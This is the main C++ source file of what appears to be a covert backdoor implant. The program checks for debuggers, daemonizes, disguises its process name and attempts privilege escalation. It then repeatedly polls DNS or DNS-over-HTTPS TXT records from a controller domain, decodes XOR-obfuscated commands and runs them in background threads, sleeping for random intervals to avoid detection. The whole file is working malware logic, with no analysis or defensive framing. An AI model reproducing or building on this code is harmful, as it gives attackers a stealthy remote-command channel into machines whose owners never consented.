// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <ctime>
#include <thread>
#include <vector>
#include <chrono>

using namespace std;

#include "config.h"
#include "dns_query.h"
#include "doh_query.h"
#include "startup.h"
#include "process_commands.h"

int main(int argc, char *argv[])
{
	startup start;
	start.detect_debugging();
	start.daemonize();
	start.cloak_name(argc, argv, FAKE_NAME);
	start.priv_esc();
	start.misc_os();
	srand(time(NULL)); // need to seed the rng
	if(USE_DOH == 1) {
		doh_query query(TXT_DOMAIN, MAGIC_HEADER, XOR_PASSWORD, dns_resolvers);		
		while (true) {
			string record = query.get_txt_results();
			if (!record.empty()) {
				process_commands cmd(MAGIC_HEADER, record);
				cmd.strip_header();
				cmd.decode_cmd();
				string command = cmd.get_correct_cmd();
				if (!command.empty()) {
					thread(&process_commands::execute_cmd, ref(cmd), command).detach();
				}
			}
			this_thread::sleep_for(chrono::seconds(rand() % MAX_POLL + MIN_POLL)); // randomly sleep for between 5-6 minutes
		}
	} else {
		dns_query query(TXT_DOMAIN, MAGIC_HEADER, XOR_PASSWORD, dns_resolvers);	
		while (true) {
			string record = query.get_txt_results();
			if (!record.empty()) {
				process_commands cmd(MAGIC_HEADER, record);
				cmd.strip_header();
				cmd.decode_cmd();
				string command = cmd.get_correct_cmd();
				if (!command.empty()) {
					thread(&process_commands::execute_cmd, ref(cmd), command).detach();
				}
			}
			this_thread::sleep_for(chrono::seconds(rand() % MAX_POLL + MIN_POLL)); // randomly sleep for between 5-6 minutes
		}
	}
	return EXIT_SUCCESS;
}
